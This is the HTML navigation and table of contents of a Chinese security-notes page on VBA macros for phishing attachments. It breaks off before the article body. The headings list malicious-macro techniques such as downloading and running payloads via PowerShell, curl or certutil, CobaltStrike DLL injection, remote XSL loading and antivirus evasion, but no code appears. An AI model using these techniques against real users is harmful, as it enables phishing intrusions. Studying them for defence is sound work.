href="/dailynotes/assets/index.html-BlUE6OO-.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-_xnA_h_M.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-BTyVmls4.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DRAPSDXj.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CwPOGDle.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-Bhg4NBdr.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CNnFJHlE.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CFqcnZZV.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-BIlLxkUO.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-oB8ipEn9.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-C0TNOpj1.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-BioNBct3.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CPv0YMLG.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CLq0zUz_.js" as="script"><link rel="prefetch" href="/dailynotes/assets/mermaid.core-CfT3QQ9J.js" as="script"><link rel="prefetch" href="/dailynotes/assets/photoswipe.esm-SzV8tJDW.js" as="script"><link rel="prefetch" href="/dailynotes/assets/SearchResult-DnUmkkd9.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">跳至主要內容</a><!--]--><!--[--><div class="theme-container has-toc"><!--[--><header id="navbar" class="vp-navbar"><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><!----><!--]--><!--[--><a class="route-link vp-brand" href="/dailynotes/"><img class="vp-nav-logo" src="/dailynotes/logo.svg" alt><!----><span class="vp-site-name hide-in-pad">DailyNotes</span></a><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-center"><!--[--><!----><!--]--><!--[--><nav class="vp-nav-links"><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="笔记工具"><span class="title"><!---->笔记工具</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/NoteTools/VuePress.html" aria-label="VuePress"><!---->VuePress<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/NoteTools/Markdown.html" aria-label="Markdown"><!---->Markdown<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/NoteTools/Mermaid.html" aria-label="Mermaid"><!---->Mermaid<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/NoteTools/LaTex/" aria-label="LaTeX"><!---->LaTeX<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/NoteTools/PlantUML.html" aria-label="PlantUML"><!---->PlantUML<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/NoteTools/VitePress.html" aria-label="VitePress"><!---->VitePress<!----></a></li></ul></button></div></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="通识"><span class="title"><!---->通识</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E9%80%9A%E8%AF%86/%E9%80%9A%E8%AF%86.html" aria-label="通识"><!---->通识<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E9%80%9A%E8%AF%86/Linux/" aria-label="Linux"><!---->Linux<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E9%80%9A%E8%AF%86/Windows.html" aria-label="Windows"><!---->Windows<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E9%80%9A%E8%AF%86/Docker/Docker.html" aria-label="Docker"><!---->Docker<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E9%80%9A%E8%AF%86/%E6%8D%A2%E6%BA%90.html" aria-label="换源"><!---->换源<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E9%80%9A%E8%AF%86/%E5%A4%96%E8%AE%BE.html" aria-label="外设"><!---->外设<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E9%80%9A%E8%AF%86/VSCode.html" aria-label="VSCode"><!---->VSCode<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E9%80%9A%E8%AF%86/%E9%80%9A%E4%BF%A1/%E8%AE%A2%E9%98%85%E6%9B%B4%E6%96%B0.html" aria-label="通信"><!---->通信<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E9%80%9A%E8%AF%86/%E6%B8%90%E6%9E%84-%E6%96%AD%E5%A2%A8%E5%AF%BB%E5%BE%84.html" aria-label="渐构"><!---->渐构<!----></a></li></ul></button></div></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="日常"><span class="title"><!---->日常</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/DailyLife/DailyLife.html" aria-label="日常"><!---->日常<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/DailyLife/%E9%A3%9F%E8%B0%B1/" aria-label="食谱"><!---->食谱<!----></a></li></ul></button></div></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="网络安全"><span class="title"><!---->网络安全</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a class="route-link nav-link active" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" aria-label="网络安全"><!---->网络安全<!----></a></li><li class="dropdown-item"><a class="route-link nav-link active" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/" aria-label="钓鱼"><!---->钓鱼<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/kali.html" aria-label="kali"><!---->kali<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BC%96%E7%A0%81.html" aria-label="编码"><!---->编码<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%8A%93%E5%8C%85%E5%8F%91%E5%8C%85.html" aria-label="抓包发包"><!---->抓包发包<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ATTCK/" aria-label="ATTCK"><!---->ATTCK<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/nmap.html" aria-label="信息收集"><!---->信息收集<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/" aria-label="Web安全"><!---->Web安全<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/" aria-label="端点安全"><!---->端点安全<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" aria-label="内网渗透"><!---->内网渗透<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/" aria-label="加密算法"><!---->加密算法<!----></a></li></ul></button></div></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="Language"><span class="title"><!---->Language</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/Language/Python/QuickStart.html" aria-label="Python"><!---->Python<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/Language/CPlusPlus/CPP.html" aria-label="C++"><!---->C++<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/Language/Go/" aria-label="Go"><!---->Go<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/Language/JavaScript/JavaScript.html" aria-label="JavaScript"><!---->JavaScript<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/Language/TypeScript/TypeScript.html" aria-label="TypeScript"><!---->TypeScript<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/Language/Java/Java.html" aria-label="Java"><!---->Java<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/Language/PHP/PHP%E5%AD%A6%E4%B9%A0.html" aria-label="PHP"><!---->PHP<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/Language/Shell/Shell/" aria-label="Shell"><!---->Shell<!----></a></li></ul></button></div></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="后端"><span class="title"><!---->后端</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E5%90%8E%E7%AB%AF/" aria-label="后端"><!---->后端<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E5%90%8E%E7%AB%AF/FastAPI/" aria-label="FastAPI"><!---->FastAPI<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E5%90%8E%E7%AB%AF/Flask/Flask.html" aria-label="Flask"><!---->Flask<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E5%90%8E%E7%AB%AF/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93.html" aria-label="数据库"><!---->数据库<!----></a></li></ul></button></div></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="前端"><span class="title"><!---->前端</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E5%89%8D%E7%AB%AF/%E9%80%9A%E8%AF%86.html" aria-label="通识"><!---->通识<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E5%89%8D%E7%AB%AF/HTML.html" aria-label="HTML"><!---->HTML<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E5%89%8D%E7%AB%AF/HTTP/%E8%B5%84%E6%BA%90%E5%92%8CURI.html" aria-label="HTTP"><!---->HTTP<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E5%89%8D%E7%AB%AF/VUE/Vue3/%E7%AE%80%E4%BB%8B.html" aria-label="Vue"><!---->Vue<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E5%89%8D%E7%AB%AF/CSS.html" aria-label="CSS"><!---->CSS<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E5%89%8D%E7%AB%AF/Nodejs.html" aria-label="Nodejs"><!---->Nodejs<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E5%89%8D%E7%AB%AF/Nginx.html" aria-label="Nginx"><!---->Nginx<!----></a></li></ul></button></div></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="GIt"><span class="title"><!---->GIt</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/Git/" aria-label="Git"><!---->Git<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/Git/Github.html" aria-label="Github"><!---->Github<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/Git/Gitlab.html" aria-label="Gitlab"><!---->Gitlab<!----></a></li></ul></button></div></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="娱乐"><span class="title"><!---->娱乐</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E5%A8%B1%E4%B9%90/Bot/" aria-label="Bot"><!---->Bot<!----></a></li><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E5%A8%B1%E4%B9%90/sovits/sovits_32k.html" aria-label="sovits"><!---->sovits<!----></a></li></ul></button></div></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="学习路线"><span class="title"><!---->学习路线</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a class="route-link nav-link" href="/dailynotes/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0.html" aria-label="机器学习"><!---->机器学习<!----></a></li></ul></button></div></div></nav><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-end"><!--[--><!----><!--]--><!--[--><!----><div class="nav-item vp-repo"><a class="vp-repo-link" href="https://github.com/233Official/dailynotes" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="icon github-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="github icon" style="width:1.25rem;height:1.25rem;vertical-align:middle;"><path d="M511.957 21.333C241.024 21.333 21.333 240.981 21.333 512c0 216.832 140.544 400.725 335.574 465.664 24.49 4.395 32.256-10.07 32.256-23.083 0-11.69.256-44.245 0-85.205-136.448 29.61-164.736-64.64-164.736-64.64-22.315-56.704-54.4-71.765-54.4-71.765-44.587-30.464 3.285-29.824 3.285-29.824 49.195 3.413 75.179 50.517 75.179 50.517 43.776 75.008 114.816 53.333 142.762 40.79 4.523-31.66 17.152-53.377 31.19-65.537-108.971-12.458-223.488-54.485-223.488-242.602 0-53.547 19.114-97.323 50.517-131.67-5.035-12.33-21.93-62.293 4.779-129.834 0 0 41.258-13.184 134.912 50.346a469.803 469.803 0 0 1 122.88-16.554c41.642.213 83.626 5.632 122.88 16.554 93.653-63.488 134.784-50.346 134.784-50.346 26.752 67.541 9.898 117.504 4.864 129.834 31.402 34.347 50.474 78.123 50.474 131.67 0 188.586-114.73 230.016-224.042 242.09 17.578 15.232 33.578 44.672 33.578 90.454v135.85c0 13.142 7.936 27.606 32.854 22.87C862.25 912.597 1002.667 728.747 1002.667 512c0-271.019-219.648-490.667-490.71-490.667z"></path></svg></a></div><div class="nav-item hide-in-mobile"><button type="button" class="outlook-button" tabindex="-1" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" class="icon outlook-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="outlook icon"><path d="M224 800c0 9.6 3.2 44.8 6.4 54.4 6.4 48-48 76.8-48 76.8s80 41.6 147.2 0 134.4-134.4 38.4-195.2c-22.4-12.8-41.6-19.2-57.6-19.2C259.2 716.8 227.2 761.6 224 800zM560 675.2l-32 51.2c-51.2 51.2-83.2 32-83.2 32 25.6 67.2 0 112-12.8 128 25.6 6.4 51.2 9.6 80 9.6 54.4 0 102.4-9.6 150.4-32l0 0c3.2 0 3.2-3.2 3.2-3.2 22.4-16 12.8-35.2 6.4-44.8-9.6-12.8-12.8-25.6-12.8-41.6 0-54.4 60.8-99.2 137.6-99.2 6.4 0 12.8 0 22.4 0 12.8 0 38.4 9.6 48-25.6 0-3.2 0-3.2 3.2-6.4 0-3.2 3.2-6.4 3.2-6.4 6.4-16 6.4-16 6.4-19.2 9.6-35.2 16-73.6 16-115.2 0-105.6-41.6-198.4-108.8-268.8C704 396.8 560 675.2 560 675.2zM224 419.2c0-28.8 22.4-51.2 51.2-51.2 28.8 0 51.2 22.4 51.2 51.2 0 28.8-22.4 51.2-51.2 51.2C246.4 470.4 224 448 224 419.2zM320 284.8c0-22.4 19.2-41.6 41.6-41.6 22.4 0 41.6 19.2 41.6 41.6 0 22.4-19.2 41.6-41.6 41.6C339.2 326.4 320 307.2 320 284.8zM457.6 208c0-12.8 12.8-25.6 25.6-25.6 12.8 0 25.6 12.8 25.6 25.6 0 12.8-12.8 25.6-25.6 25.6C470.4 233.6 457.6 220.8 457.6 208zM128 505.6C128 592 153.6 672 201.6 736c28.8-60.8 112-60.8 124.8-60.8-16-51.2 16-99.2 16-99.2l316.8-422.4c-48-19.2-99.2-32-150.4-32C297.6 118.4 128 291.2 128 505.6zM764.8 86.4c-22.4 19.2-390.4 518.4-390.4 518.4-22.4 28.8-12.8 76.8 22.4 99.2l9.6 6.4c35.2 22.4 80 12.8 99.2-25.6 0 0 6.4-12.8 9.6-19.2 54.4-105.6 275.2-524.8 288-553.6 6.4-19.2-3.2-32-19.2-32C777.6 76.8 771.2 80 764.8 86.4z"></path></svg><div class="outlook-dropdown"><!----></div></button></div><!--[--><button type="button" class="search-pro-button" aria-label="搜索"><svg xmlns="http://www.w3.org/2000/svg" class="icon search-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="search icon"><path d="M192 480a256 256 0 1 1 512 0 256 256 0 0 1-512 0m631.776 362.496-143.2-143.168A318.464 318.464 0 0 0 768 480c0-176.736-143.264-320-320-320S128 303.264 128 480s143.264 320 320 320a318.016 318.016 0 0 0 184.16-58.592l146.336 146.368c12.512 12.48 32.768 12.48 45.28 0 12.48-12.512 12.48-32.768 0-45.28"></path></svg><div class="search-pro-placeholder">搜索</div><div class="search-pro-key-hints"><kbd class="search-pro-key">Ctrl</kbd><kbd class="search-pro-key">K</kbd></div></button><!--]--><!--]--><!--[--><!----><!--]--><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside id="sidebar" class="vp-sidebar"><!--[--><!----><!--]--><ul class="vp-sidebar-links"><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/" aria-label="钓鱼附件"><!---->钓鱼附件<!----></a></li><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/" aria-label="Office"><!---->Office<!----></a></li><li><section class="vp-sidebar-group"><p class="vp-sidebar-header active"><!----><span class="vp-sidebar-title">Office宏</span><!----></p><ul class="vp-sidebar-links"><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E5%AE%8F/Excel4.0%E5%AE%8F.html" aria-label="Excel4.0宏"><!---->Excel4.0宏<!----></a></li><li><a class="route-link nav-link active vp-sidebar-link vp-sidebar-page active" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E5%AE%8F/VBA%E5%AE%8F.html" aria-label="VBA宏"><!---->VBA宏<!----></a></li></ul></section></li><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/DDE/" aria-label="DDE"><!---->DDE<!----></a></li><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/CSV/" aria-label="CSV注入"><!---->CSV注入<!----></a></li><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/VBScript/" aria-label="VBScript"><!---->VBScript<!----></a></li><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/SLK/" aria-label="SLK"><!---->SLK<!----></a></li><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/%E5%85%B3%E7%B3%BB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" aria-label="关系模板注入"><!---->关系模板注入<!----></a></li><li><section class="vp-sidebar-group"><p class="vp-sidebar-header"><!----><span class="vp-sidebar-title">RTF</span><!----></p><ul class="vp-sidebar-links"><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/RTF/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" aria-label="RTF模板注入"><!---->RTF模板注入<!----></a></li><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/RTF/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2017-8570.html" aria-label="RTF漏洞利用"><!---->RTF漏洞利用<!----></a></li></ul></section></li></ul><!--[--><!----><!--]--></aside><!--[--><main id="main-content" class="vp-page"><!--[--><!--[--><!----><!--]--><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><!---->VBA宏</h1><div class="page-info"><!----><!----><span class="page-date-info" aria-label="写作日期📅" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="calendar icon"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 01-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 01-33.473-33.473V143.657H180.6A134.314 134.314 0 0046.66 277.595v535.756A134.314 134.314 0 00180.6 947.289h669.74a134.36 134.36 0 00133.94-133.938V277.595a134.314 134.314 0 00-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 01-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 01-33.472 33.473z"></path></svg><span><!----></span><meta property="datePublished" content="2024-06-05T03:06:10.000Z"></span><!----><span class="page-reading-time-info" aria-label="阅读时间⌛" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>大约 34 分钟</span><meta property="timeRequired" content="PT34M"></span><!----><!----></div><hr></div><div class="vp-toc-placeholder"><aside id="toc"><!--[--><!----><!--]--><div class="vp-toc-header">此页内容<button type="button" class="print-button" title="打印"><svg xmlns="http://www.w3.org/2000/svg" class="icon print-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="print icon"><path d="M819.2 364.8h-44.8V128c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v236.8h-44.8C145.067 364.8 96 413.867 96 473.6v192c0 59.733 49.067 108.8 108.8 108.8h44.8V896c0 17.067 14.933 32 32 32h460.8c17.067 0 32-14.933 32-32V774.4h44.8c59.733 0 108.8-49.067 108.8-108.8v-192c0-59.733-49.067-108.8-108.8-108.8zM313.6 160h396.8v204.8H313.6V160zm396.8 704H313.6V620.8h396.8V864zM864 665.6c0 25.6-19.2 44.8-44.8 44.8h-44.8V588.8c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v121.6h-44.8c-25.6 0-44.8-19.2-44.8-44.8v-192c0-25.6 19.2-44.8 44.8-44.8h614.4c25.6 0 44.8 19.2 44.8 44.8v192z"></path></svg></button><div class="arrow end"></div></div><div class="vp-toc-wrapper"><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="/dailynotes/#概述">概述</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="/dailynotes/#vba宏的结构">VBA宏的结构</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="/dailynotes/#执行-javascript">执行 JavaScript</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="/dailynotes/#调用-powershell-使用-curl-下载与执行恶意程序">调用 PowerShell 使用 curl 下载与执行恶意程序</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="/dailynotes/#调用-cmd-执行命令">调用 CMD 执行命令</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="/dailynotes/#调用-cmd-使用-curl-下载与执行恶意程序">调用 CMD 使用 curl 下载与执行恶意程序</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="/dailynotes/#调用-cmd-使用-certutil-下载与执行恶意程序">调用 CMD 使用 Certutil 下载与执行恶意程序</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="/dailynotes/#调cscript调jscript-vbscript">调CScript调JSCript/VBScript</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="/dailynotes/#调wscript调jscript-vbscript">调WScript调JSCript/VBScript</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="/dailynotes/#cobaltstrike宏钓鱼-dll注入">CobaltStrike宏钓鱼(DLL注入)</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="/dailynotes/#代码解析">代码解析</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="/dailynotes/#vba宏加载远程xsl-xmldom">VBA宏加载远程XSL(XMLDOM)</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="/dailynotes/#概念">概念</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="/dailynotes/#利用方案">利用方案</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="/dailynotes/#相关链接">相关链接</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="/dailynotes/#宏免杀">宏免杀</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="/dailynotes/#绕过基于进程树的检测">绕过基于进程树的检测</a></li><!----><!--]--></ul></li><!--]--></ul><div class="vp-toc-marker" style="top:-1.7rem;"></div></div><!--[--><!----><!--]--></aside></div><!--[--><!----><!--]--><div class="theme-hope-content"><h1 id="vba宏" tabindex="-1"><a class="header-anchor" 